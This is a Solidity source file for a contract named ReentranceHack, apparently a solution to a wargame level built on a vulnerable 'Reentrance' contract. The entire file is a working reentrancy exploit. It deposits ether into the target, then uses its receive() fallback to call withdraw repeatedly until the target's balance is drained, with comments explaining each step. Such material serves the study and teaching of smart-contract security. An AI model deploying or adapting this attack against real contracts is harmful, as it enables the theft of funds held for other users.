// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Reentrance.sol';


contract ReentranceHack{

    address payable owner;
    address payable contractAddress;
    uint amount;
    Reentrance reentrance;
   
    constructor(address payable _contractAddress) public {
        // set vulnerable contract deployment address 
        // on deployment
        owner = msg.sender;
        contractAddress = _contractAddress;
        // create instance of vulnerable contract
        reentrance = Reentrance(contractAddress);

    }


    function attack() external payable {
        // receive ether from msg.sender
        // pass the ether to the vulnerable contract
        // then we have a balance in their mapping
        // then call withdraw func
        amount = msg.value;
        reentrance.donate{value: amount}(address(this));
        withdraw(); 
    }


    function withdraw() private {
        // withdraw checks that the vulnerablecontract has a +ve
        // balance. If so, we withdraw some ether. While our
        // deposit amount is smaller than the contract balance we
        // can withdraw <= deposit amount. When the contract balance
        // is less than our deposit amount we just withdraw whatever 
        // remains

        uint withdrawAmount;

        if (address(reentrance).balance > 0){
        
            if (address(reentrance).balance < amount){
                withdrawAmount = address(reentrance).balance;
            }
            
            else{
                withdrawAmount = amount;
            }

            reentrance.withdraw(withdrawAmount);
        }
    }



    receive() external payable{
    // this is our fallback function. When ether is received,
    // withdraw() is executed        
        withdraw();

    }



}